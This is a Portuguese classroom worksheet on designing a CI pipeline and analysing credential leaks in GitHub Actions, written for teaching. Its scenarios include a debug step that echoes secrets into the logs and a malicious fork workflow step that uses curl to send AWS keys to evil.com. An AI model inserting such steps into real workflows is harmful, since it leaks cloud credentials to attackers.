# Aula 08 — Trabalho em Aula

## Objetivo

Atividade prática em grupo durante o Bloco 1 da aula (~30 minutos). Os alunos devem aplicar os conceitos do TA para projetar um pipeline CI e analisar cenários de exposição de credenciais.

---

## Parte 1 — Design de Pipeline CI (15 min)

### Contexto

Vocês são a equipe DevOps da TechNova. A aplicação `technova-api` é uma API Node.js/Express com:
- 8 arquivos JavaScript (server.js, routes/, models/)
- Dependências: express, pg (PostgreSQL client), dotenv
- Dockerfile existente (multi-stage build)
- Testes existentes (mas ninguém roda antes do deploy)
- Deploy atual: manual, SSH, 32 minutos

### Atividade

Em grupo (3-4 pessoas), projetem o pipeline CI ideal para a TechNova:

**1. Listem os estágios do pipeline (em ordem):**
- Quais verificações devem ser feitas?
- Em que ordem devem executar?
- Quais são obrigatórias (bloqueiam merge) vs opcionais (informativas)?

**2. Para cada estágio, definam:**
- O que exatamente é verificado?
- Quanto tempo estimado de execução?
- O que acontece se falhar? (bloqueia pipeline ou apenas avisa?)

**3. Respondam:**
- O pipeline deve rodar em push para main, em PRs, ou ambos?
- Quando um PR deveria ser bloqueado de merge?
- Como o time fica sabendo que algo quebrou?

### Formato de Entrega

Desenhem o pipeline em formato de diagrama (pode ser texto):

```
Exemplo:
[push/PR] → [estágio 1: ???] → [estágio 2: ???] → [estágio 3: ???] → [resultado]
                  │                    │                    │
              falha → ???          falha → ???          falha → ???
```

---

## Parte 2 — Análise de Segurança de Credenciais (15 min)

### Cenários

Analisem os 3 cenários abaixo. Para cada um, discutam:
- **O que aconteceu?** (causa raiz)
- **Qual o impacto?** (o que um atacante pode fazer)
- **Como prevenir?** (medida técnica específica)
- **Como detectar?** (como saber que aconteceu)

---

**Cenário 1: O `.env` esquecido**

Um desenvolvedor junior criou um `.env` local com suas credenciais AWS pessoais para testar a aplicação. Usou `git add .` seguido de `git push` para main. Percebeu o erro 2 horas depois e deletou o arquivo com outro commit.

Perguntas:
- As credenciais estão seguras após o commit de deleção?
- O que um atacante consegue fazer com AWS access keys?
- Qual medida preventiva impede esse cenário 100%?

---

**Cenário 2: O workflow indiscreto**

Um desenvolvedor adicionou um step de debug no workflow CI:

```yaml
- name: Debug
  run: |
    echo "DB_HOST=${{ secrets.DB_HOST }}"
    echo "DB_PASS=${{ secrets.DB_PASSWORD }}"
    echo "AWS_KEY=${{ secrets.AWS_ACCESS_KEY_ID }}"
```

Perguntas:
- O GitHub mascara secrets nos logs. Isso é 100% seguro?
- Quais situações podem contornar a máscara? (ex: base64 encode)
- Devemos permitir echo de secrets, mesmo mascarados?

---

**Cenário 3: O PR do fork**

A TechNova abriu o repositório como open source. Um contribuidor externo faz fork, adiciona um step malicioso no workflow do PR:

```yaml
- name: Helpful tests
  run: |
    curl -X POST https://evil.com/steal \
      -d "key=${{ secrets.AWS_ACCESS_KEY_ID }}" \
      -d "secret=${{ secrets.AWS_SECRET_ACCESS_KEY }}"
```

Perguntas:
- O GitHub passa secrets para workflows de PRs de forks?
- Se não, como o atacante poderia tentar contornar isso?
- Que proteção adicional devemos ter para repos open source?

---

## Critérios de Avaliação

| Critério | Peso |
|----------|:----:|
| Pipeline tem estágios em ordem lógica | 25% |
| Justificativa clara para cada estágio | 25% |
| Análise correta dos 3 cenários de segurança | 25% |
| Medidas de prevenção são específicas e implementáveis | 25% |

---

## Discussão em Grupo (facilitada pelo professor)

Após os 30 minutos de atividade, o professor facilita uma discussão comparando as soluções dos grupos:

1. **Pipeline Design:** Quais estágios foram comuns entre todos os grupos? Algum grupo pensou em algo diferente?
2. **Cenário 1:** Confirmação: `git log` mantém o histórico. O secret precisa ser revogado, não apenas deletado do código.
3. **Cenário 2:** O GitHub mascara, mas secrets podem vazar via encoding (base64), substrings, ou logs de terceiros.
4. **Cenário 3:** GitHub Actions NÃO passa secrets para workflows de forks. É uma proteção de design.

> **Conexão com o laboratório:** A atividade prática agora vai transformar esse design em um pipeline real no GitHub Actions.

---

## Entrega

### Onde entregar

No fork do repositório da disciplina, na pasta de entrega da aula:

```
entregas/aula-08/SEU-RA/trabalho-em-aula.md
```

### O que entregar

Um arquivo `trabalho-em-aula.md` com as respostas das atividades realizadas em sala:

```markdown
# Trabalho em Aula — Aula 08: GitHub Actions e CI Pipelines

**Aluno:** [Seu nome completo]
**RA:** [Seu RA]
**Data:** [Data da aula]

## Parte 1 — Design de Pipeline CI

### Estágios do pipeline (em ordem)
| Estágio | O que verifica | Obrigatório? | Tempo estimado |
|---------|---------------|:------------:|:-------------:|
| | | | |

### Respostas
- O pipeline deve rodar em: ...
- Um PR deve ser bloqueado quando: ...
- Como o time fica sabendo que quebrou: ...

## Parte 2 — Análise de Segurança de Credenciais

### Cenário 1 — O `.env` esquecido
- O que aconteceu: ...
- Impacto: ...
- Como prevenir: ...
- Como detectar: ...

### Cenário 2 — O workflow indiscreto
- O que aconteceu: ...
- Impacto: ...
- Como prevenir: ...
- Como detectar: ...

### Cenário 3 — O PR do fork
- O que aconteceu: ...
- Impacto: ...
- Como prevenir: ...
- Como detectar: ...
```

### Como entregar

- O arquivo pode ser adicionado no **mesmo PR** do TF ou em PR separado
- A entrega é **individual** — mesmo que a atividade tenha sido em grupo
- O trabalho em aula vale **1 ponto na nota final** do semestre (contabilizado apenas ao final, com **todos** os trabalhos entregues)
